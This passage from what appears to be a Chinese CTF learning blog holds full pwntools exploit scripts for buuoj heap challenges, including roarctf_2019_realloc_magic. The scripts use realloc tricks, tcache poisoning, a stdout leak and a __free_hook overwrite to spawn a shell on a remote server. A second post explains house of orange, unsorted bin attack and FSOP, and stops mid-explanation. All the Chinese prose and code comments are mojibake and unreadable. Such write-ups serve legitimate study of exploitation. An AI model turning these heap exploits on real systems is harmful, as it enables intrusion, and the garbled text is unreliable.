class="number">0xc1</span>)+<span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0xDD0,0xDD7,0xdde,0xde5)</span></span><br><span class="line">    add_r(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_m(<span class="number">0xb0</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add_r(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">    add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">    add_r(-<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add_r(<span class="number">0x30</span>,p64(sys_addr))</span><br><span class="line">    add_c(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27177</span>)</span><br><span class="line">        <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220826111557058-2083144726.png"></p><h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-3"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-3" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/2706180-20220826111633948-308368104.png"></p><p>è¿™é“é¢˜å’Œä¸Šé¢é‚£é“é¢˜åŸºæœ¬ä¸Šä¸€æ¨¡ä¸€æ ·ï¼Œæ€è·¯å•¥çš„ä¹Ÿéƒ½ä¸€æ ·ã€‚å…·ä½“å°±ä¸å†æ”¾è°ƒè¯•çš„å›¾ç‰‡äº†ã€‚å…·ä½“çš„è¿‡ç¨‹å†™åˆ°expçš„æ³¨é‡Šé‡Œäº†ã€‚</p><p>ä¸€å¥è¯æ€»ç»“è¿™é¢˜å’Œä¸Šé¢é‚£é“é¢˜å°±æ˜¯åˆ©ç”¨reallocå‘ä¸‹åˆå¹¶çš„æ¼æ´åœ¨tcachebinä¸­è¸©å‡ºunsorted binçš„fdæŒ‡é’ˆã€‚</p><h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#e=ELF(&#x27;./a&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/hacker/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size?\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content?\n&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#å…ˆç”³è¯·ä¸€ä¸ªå¤§å †å—A</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#ç„¶åreallocç”³è¯·sizeä¸º0çš„å †å—ï¼Œç½®ç©ºå…¶æŒ‡é’ˆ</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#ç”³è¯·ä¸€ä¸ªç”¨æ¥é˜²æ­¢åˆå¹¶çš„å°å †å—</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#reallocç”³è¯·sizeä¸º0çš„å †å—ï¼Œç½®ç©ºå…¶æŒ‡é’ˆ</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#å› ä¸ºåˆšæ‰ç”³è¯·sizeä¸º0çš„å †å—çš„æ—¶å€™ï¼Œè¿™ä¸ªå †å—Aè¢«é‡Šæ”¾äº†ï¼Œç°åœ¨å†ç”³è¯·å›æ¥</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;s&#x27;</span>)<span class="comment">#æ­¤æ—¶å †å—Aå˜æˆäº†ä½¿ç”¨çŠ¶æ€çš„å †å—B+ç©ºé—²çŠ¶æ€çš„å †å—C å †å—Bä¸º0x70 å †å—Cä¸º0x80</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#ç½®ç©ºæŒ‡é’ˆ</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;uuuu&#x27;</span>)<span class="comment">#å°†å †å—Cç”³è¯·å‡ºæ¥</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete()</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#ä¸Šé¢é‡Šæ”¾äº†å †å—Cä¸ƒæ¬¡ï¼ŒåŠ ä¸Šè¿™ä¸€æ¬¡ï¼Œå †å—CæˆåŠŸè¿›å…¥äº†unsorted binä¸­</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#å°†å †å—Bç”³è¯·å›æ¥</span></span><br><span class="line">    add(<span class="number">0x100</span>,p64(<span class="number">0x0</span>)*<span class="number">15</span>+p64(<span class="number">0x81</span>)+<span class="string">b&#x27;\x60\x87&#x27;</span>)<span class="comment">#åˆ©ç”¨reallocå‡½æ•°ï¼Œå‘ä¸‹åˆå¹¶ç©ºé—²å †å—ï¼Œè‡³æ­¤å †å—Aå›æ¥äº†ï¼Œæˆ‘ä»¬å‘å †å—Aå†™å…¥æ•°æ®å°±å¯ä»¥ç¼–è¾‘åŸæœ¬å †å—Cçš„fdæŒ‡é’ˆï¼Œä»è€Œå°†å…¶æ”¹å†™ä¸ºstdoutç»“æ„ä½“åœ°å€</span></span><br><span class="line">    <span class="comment">#ä¸Šé¢æ­¥éª¤æœ€æ ¸å¿ƒçš„åœ°æ–¹æ˜¯è¿™ä¸ª0x81ï¼Œæœ¬æ¥è¿™ä¸ªä½ç½®çš„å †å—Cçš„å®é™…å¤§å°ä¸º0x91ï¼Œä½†å¦‚æœæˆ‘ä»¬ä¸ä¿®æ”¹å®ƒï¼Œä¹‹åçš„tcache dup+tcache poisoningæ˜¯æ²¡æ³•è¿›è¡Œçš„ï¼Œå¿…é¡»è¦ç ´åå®ƒçš„sizeï¼Œæ‰èƒ½ä¿è¯ä¸‹é¢æ­¥éª¤çš„æ­£ç¡®è¿›è¡Œã€‚</span></span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0xba2,0xbae,0xA76)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#å°†stdoutç»“æ„ä½“ç”³è¯·äº†å‡ºæ¥</span></span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line"></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">666</span>))<span class="comment">#æ¸…ç©ºptræŒ‡é’ˆï¼Œå› ä¸ºæ­¤æ—¶çš„ptræŒ‡é’ˆå°±æ˜¯stdoutç»“æ„ä½“åœ°å€ï¼Œå¦‚æœå¯¹è¿™ä¸ªåœ°å€è¿›è¡Œé‡Šæ”¾çš„è¯ï¼Œç¨‹åºä¼šå´©æºƒï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç”¨å”¯ä¸€çš„æœºä¼šå°†å…¶ç½®é›¶</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#æ¥ä¸‹æ¥å°±æ˜¯é‡å¤ä¸Šé¢çš„æ­¥éª¤ tcache dup+tcache poisoning å¾€free_hookä¸­å†™å…¥systemåœ°å€</span></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete()</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x91</span>)+p64(free_hook-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">    delete()</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25279</span>)</span><br><span class="line">        <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">        pwn()    </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220826111647020-1771891318.png"></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> io leak </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºhouse of orange(unsorted bin attack &amp;&amp;FSOP)çš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/f0d8c344.html"/>
      <url>/posts/f0d8c344.html</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢ï¼š"><a href="#å†™åœ¨å‰é¢ï¼š" class="headerlink" title="å†™åœ¨å‰é¢ï¼š"></a>å†™åœ¨å‰é¢ï¼š</h2><p>é€šè¿‡å­¦ä¹ house of orangeï¼Œåˆå¯¹unsorted bin attackä»¥åŠFSOPæœ‰äº†ä¸€äº›æ–°çš„ç†è§£ã€‚è¯´åˆ°åº•house of orangeæœ¬èº«çš„æ•ˆæœå¾ˆå°ï¼Œä½†åŠ ä¸Šä¸¤ä¸ªç»„åˆæ‹³(unsorted bin attackå’ŒFSOP)åˆ™å¨åŠ›å°±ä¼šå˜çš„å¾ˆå¤§ã€‚è¿™ç¯‡æ–‡ç« æˆ‘å°†å¯¹è¿™ä¸‰ç§æ‰‹æ³•éƒ½è¯¦ç»†è®°å½•ä¸€ä¸‹åŸç†å’Œåˆ©ç”¨æ–¹å¼ï¼Œæœ€åæ”¾ä¸Šä¾‹é¢˜ã€‚</p><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>åœ¨æ­¤ï¼Œå…ˆå¯¹house of orangeä»¥åŠåç»­æ•´ä½“çš„æµç¨‹ç®€å•æ€»ç»“ä¸€ä¸‹ï¼š</p><blockquote><p> æœ€å¼€å§‹æˆ‘ä»¬å…ˆç”¨house of orangeå°†åŸæœ¬çš„top chunkæ”¾å…¥unsorted binä¸­ã€‚ç„¶ååˆ©ç”¨æº¢å‡ºç¯¡æ”¹unsorted biné‡Œçš„chunkçš„sizeä¸º0x60ï¼ŒåŒæ—¶è¿˜ç¯¡æ”¹äº†è¯¥chunkçš„bkæŒ‡é’ˆã€‚æœ€åæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªä»»æ„å¤§å°çš„chunkï¼Œå¼€å§‹è§¦å‘æ”»å‡»é“¾ï¼Œé¦–å…ˆptmallocä¼šå…ˆéå†unsorted bin(æ­¤æ—¶å‰é¢å·²ç»éå†äº†fast binå’Œsmall bin)ï¼Œptmallocçš„ç­–ç•¥æ˜¯ä¸€è¾¹éå†unsorted binå°è¯•å¯»æ‰¾å’Œè‡ªå·±éœ€è¦çš„sizeå®Œå…¨ç›¸åŒçš„chunkï¼Œä¸€è¾¹ç»™ä¸ç¬¦åˆæ¡ä»¶çš„chunkåˆ†ä¸‹ç±»(ä¹Ÿå°±æ˜¯æ”¾åˆ°small binæˆ–è€…large bin)ã€‚åœ¨åˆ†ç±»çš„æ—¶å€™å°±ä¼šå°†åœ¨unsorted binä¸Šçš„chunkç»™è„±é“¾ï¼Œç„¶åè§¦å‘unsorted bin attackï¼Œæ­¤æ—¶çš„IO_list_allè¢«å†™å…¥main_arena+88çš„åœ°å€ï¼Œç„¶åå‘ç°chunkçš„sizeä¸º0x60ï¼Œäºæ˜¯ç»™åˆ’åˆ†åˆ°äº†small biné‡Œã€‚è€Œ_IO_2_1_stderrçš„_chainå­—æ®µæ­£å¥½è½åœ¨äº†small bin[0x60]ä¸Šï¼Œäºæ˜¯ä¹æˆ‘ä»¬å°±æ§åˆ¶äº†_IO_2_1_stdouté‡Œçš„å†…å®¹ã€‚ç„¶åä¸ºäº†æ¥ä¸‹æ¥çš„FSOPæ”»å‡»åšå¥½å¸ƒå±€(æ§åˆ¶stdoutç»“æ„ä½“å…¶å®å°±æ˜¯å †æº¢å‡ºæ¥ç¼–è¾‘æœ€å¼€å§‹è¿›å…¥çš„é‚£ä¸ªunsorted biné‡Œçš„å †å—å†…å®¹)ã€‚ç„¶åptmallocè¿˜ä¼šç»§ç»­å»éå†unsorted bin(å› ä¸ºunsorted binè¢«unsorted bin attackæ”»å‡»ç ´åçš„åŸå› ï¼Œè®©ptmallocä»¥ä¸ºunsorted binè¿˜æœ‰chunk)ï¼Œä½†æ˜¯æ­¤æ—¶çš„victim(ä¹Ÿå°±æ˜¯å½“å‰unsorted binå‡†å¤‡é“¾å‡ºçš„chunk)å·²ç»æ˜¯æœ€å¼€å§‹è¦†ç›–unsorted bin bkçš„å€¼äº†(ä¹Ÿå°±æ˜¯IO_list_all-0x10)ã€‚ç„¶æ­¤æ—¶çš„victim-&gt;sizeä¸º0ï¼Œæ²¡æœ‰é€šè¿‡æ£€æŸ¥ï¼Œäºæ˜¯å°±è§¦å‘äº†malloc_printerrï¼Œè°ƒç”¨äº†abortï¼Œæœ€ç»ˆåˆ·æ–°æ‰€æœ‰æ–‡ä»¶æµçš„æ—¶å€™ï¼Œåˆ°stdoutç»“æ„ä½“æ—¶è§¦å‘äº†FSOPï¼ŒæˆåŠŸè·å–shellã€‚</p></blockquote><p>å…¶å®æ•´ä½“æµç¨‹å°±æ˜¯æŠŠåç»­çš„unsorted bin attackå’ŒFSOPè¿ç”¨åˆ°äº†æè‡´ã€‚</p><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><blockquote><p>ä»€ä¹ˆæ˜¯house of orange?</p><p>house of orangeè¯¥æ”»å‡»æ‰‹æ³•æ˜¯åœ¨æˆ‘ä»¬æ²¡æœ‰freeå‡½æ•°çš„æƒ…å†µä¸‹ï¼Œæ¥è·å¾—ä¸€ä¸ªåœ¨unsorted binä¸­çš„å †å—ã€‚house of orangeåˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œä½†ä¹‹åè¿˜ä¼šåˆ©ç”¨å…¶ä»–çš„æ‰‹æ³•æ¥æ‹¿åˆ°shellã€‚</p><p>åŸç†ï¼š</p><p>å¦‚æœæˆ‘ä»¬ç”³è¯·çš„å †å—å¤§å°å¤§äºäº†top chunk sizeçš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šå°†åŸæ¥çš„top chunkæ”¾å…¥unsorted binä¸­ï¼Œç„¶åå†æ˜ å°„æˆ–è€…æ‰©å±•ä¸€ä¸ªæ–°çš„top chunkå‡ºæ¥ã€‚</p><p>åˆ©ç”¨è¿‡ç¨‹ï¼š</p><p>1ã€å…ˆåˆ©ç”¨æº¢å‡ºç­‰æ–¹å¼è¿›è¡Œç¯¡æ”¹top chunkçš„size(å…·ä½“è¦æ±‚çš„è¯ä¸‹é¢å†è¯´)</p><p>2ã€ç„¶åç”³è¯·ä¸€ä¸ªå¤§äºtop chunkçš„size</p></blockquote><p>ç„¶åä¸»è¦è¯´ä¸€ä¸‹æˆ‘ä»¬å…·ä½“éœ€è¦ç»•è¿‡çš„æ£€æŸ¥</p><p>ä¸»è¦å°±æ˜¯ä¸‹é¢ä¸¤ä¸ªæ–­è¨€(å¦‚ä¸‹)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">old_top = av-&gt;top;<span class="comment">//åŸæœ¬old top chunkçš„åœ°å€</span></span><br><span class="line">old_size = chunksize (old_top);<span class="comment">//åŸæœ¬old top chunkçš„size</span></span><br><span class="line">old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));<span class="comment">//old top chunkçš„åœ°å€åŠ ä¸Šå…¶size</span></span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°ï¼Œé‚£ä¹ˆtop chunkæ˜¯æ²¡æœ‰è¢«åˆå§‹åŒ–çš„ï¼Œå¹¶ä¸”å…¶sizeè‡ªç„¶ä¸º0 ï¼Œæˆ‘ä»¬åˆ©ç”¨çš„æ—¶å€™ï¼Œè¿™é‡Œè‚¯å®šä¸æˆç«‹ï¼Œæš‚ä¸”ä¸ç”¨ç®¡</p><p>å¦‚æœä¸Šé¢è¿™ä¸ªæ¡ä»¶ä¸æˆç«‹çš„è¯ï¼Œå°±éœ€è¦ä¿è¯åŸæœ¬old top chunkçš„sizeå¤§äºMINSIZE,è¿˜éœ€è¦ä¿è¯åŸæœ¬old top chunkçš„prev_inuseä½æ˜¯1,å¹¶ä¸”åŸæœ¬old top chunkçš„åœ°å€åŠ ä¸Šå…¶sizeä¹‹åçš„åœ°å€è¦ä¸é¡µå¯¹é½ ä¹Ÿå°±æ˜¯address&amp;0xfff&#x3D;0x000ã€‚æœ€åold chunkçš„sizeå¿…é¡»è¦å°äºæˆ‘ä»¬ç”³è¯·çš„å †å—å¤§å°åŠ ä¸ŠMINSIZEã€‚</p><p>æœ€åå°±æ˜¯è¦æ³¨æ„å¦‚æœæˆ‘ä»¬ç”³è¯·çš„å †å—å¤§äºäº†0x20000ï¼Œé‚£ä¹ˆå°†ä¼šæ˜¯mmapæ˜ å°„å‡ºæ¥çš„å†…å­˜ï¼Œå¹¶éæ˜¯æ‰©å±•top chunkäº†ã€‚</p><p>æ€»ç»“ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡æ£€æŸ¥æ‰€éœ€è¦æ„é€ çš„å€¼ï¼š</p><p>old_top_size(æˆ‘ä»¬é€šè¿‡æº¢å‡ºä¿®æ”¹)     nbï¼ˆæˆ‘ä»¬ç”³è¯·çš„å †å—å¤§å°ï¼‰</p><blockquote><p>MINSIZE&lt;old_top_size&lt;nb+MINSIZE</p><p>old_top_sizeçš„prev_sizeä½æ˜¯1</p><p>(old_top_size+old_top)&amp;0xfff&#x3D;0x000</p><p>nb&lt;0x20000</p></blockquote><p>æ„é€ å®Œæˆåï¼Œæˆ‘ä»¬ç”³è¯·å‡ºæ¥nbå¤§å°çš„å †å—ï¼Œé‚£ä¹ˆtop chunkå°±ä¼šè¿›å…¥åˆ°unsorted binä¸­ã€‚</p><p><img src="/../img/2706180-20220920201613897-1312734603.png"></p><p><img src="/../img/2706180-20220920201634834-439114022.png"></p><p>æ­¤æ—¶å°±å®Œæˆäº†æ”»å‡»å‰çš„å‡†å¤‡é˜¶æ®µï¼Œè€Œæ¥ä¸‹æ¥éœ€è¦å…ˆä»‹ç»ä¸€ä¸‹unsorted bin attackã€‚</p><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>unsorted bin attackè¿™ä¸ªæ”»å‡»æ‰‹æ³•æœ€ç»ˆå¯ä»¥å®ç°å¾€ä¸€ä¸ªæŒ‡å®šåœ°å€é‡Œå†™å…¥ä¸€ä¸ªå¾ˆå¤§çš„æ•°æ®ï¼ˆmain_arena+88æˆ–main_arena+96ï¼‰</p><p>å…³äºè¿™ä¸ªæ‰‹æ³•çš„å­¦ä¹ ï¼Œå¿…é¡»è¦ææ¸…æ¥šä¸¤ä»¶äº‹ï¼Œä¸ç„¶ç†è§£èµ·æ¥æŒºæ‡µçš„ã€‚</p><p>ç¬¬ä¸€ã€ä»unsorted binä¸­å–å †å—çš„æ—¶å€™ï¼Œæ˜¯ä»å°¾éƒ¨å–çš„å †å—ã€‚</p><p><img src="/../img/2706180-20220920201921204-253619976.png"></p><p>ç¬¬äºŒã€æŠŠä¸Šè¿°çš„æƒ…å†µï¼Œç”»æˆå›¾ï¼Œåº”è¯¥æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­</p><p><img src="/../img/2706180-20220920202016161-564133422.png"></p><p>çŸ¥é“ä¸Šé¢è¿™ä¸¤ä»¶äº‹ä¹‹åï¼Œä¸‹é¢ç†è§£èµ·æ¥å°±å¾ˆå®¹æ˜“äº†ã€‚</p><p>å°±æ˜¯å½“ä»unsorted binä¸­æ‹¿å–æœ€åä¸€ä¸ªå †å—æ—¶ï¼ˆunsorted binä¸­å †å—æ˜¯ä»æœ€åä¸€ä¸ªå–çš„ï¼Œè·Ÿfastbinå’Œtcachebinè¿˜ä¸ä¸€æ ·ï¼‰ï¼Œä¼šè§¦å‘ä¸‹é¢è¿™éƒ¨åˆ†çš„æ“ä½œã€‚<strong>(ä¸‹é¢è¿™éƒ¨åˆ†æ“ä½œæ˜¯åœ¨éå†unsorted binç»™å…¶å †å—åˆ†ç±»åˆ°small binæˆ–è€…large binä¸­å®Œæˆçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦è¦†å†™äº†unsorted binä¸­chunkçš„bkæŒ‡é’ˆï¼Œåœ¨ä¸‹ä¸€æ¬¡éå†unsorted binçš„æ—¶å€™ï¼Œéƒ½å¯ä»¥è®©bk+0x10çš„ä½ç½®å†™å…¥main_arena+88&#x2F;96çš„åœ°å€(æ— è®ºnbæ˜¯å¦ç­‰äºsize)ï¼Œä½†æ˜¯å¦‚æœç”³è¯·çš„å¤§å°ä¸ç­‰åŒäºåŸæœ¬ä½äºunsorted binä¸­çš„å †å—ï¼Œå°±ä¼šåœ¨åç»­çš„æ£€æŸ¥ä¸­å¯¼è‡´ç¨‹åºå´©æºƒã€‚)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">bck = victim-&gt;bk</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure><p>å¦‚æœçœ‹ç€ä»£ç æŒºæ‡µï¼Œæˆ‘å°±ç®€å•åˆ†æä¸€ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">è¿™ä¸ªå°±æ˜¯è¯´æŠŠmain_arenaï¼ˆè¿™é‡Œçš„main_arenaæˆ‘çš„æŒ‡çš„æ˜¯ä¸Šå›¾çš„é‚£ä¸ªmain_arena bins[0,1]è¿™ä¸ªå—)çš„bkæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯chunk3çš„åœ°å€ï¼‰ç»™victim</span><br><span class="line">æ¢è¨€ä¹‹ï¼Œè¿™è¡Œä»£ç çš„æ„æ€å°±æ˜¯è¯´victimå°±æ˜¯chunk3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk</span><br><span class="line">è¿™ä¸ªå°±æ˜¯æŠŠchunk3çš„bkæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯chunk2)ç»™bck</span><br><span class="line">æ¢è¨€ä¹‹ï¼Œè¿™è¡Œä»£ç çš„æ„æ€å°±æ˜¯è¯´bckå°±æ˜¯chunk2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck</span><br><span 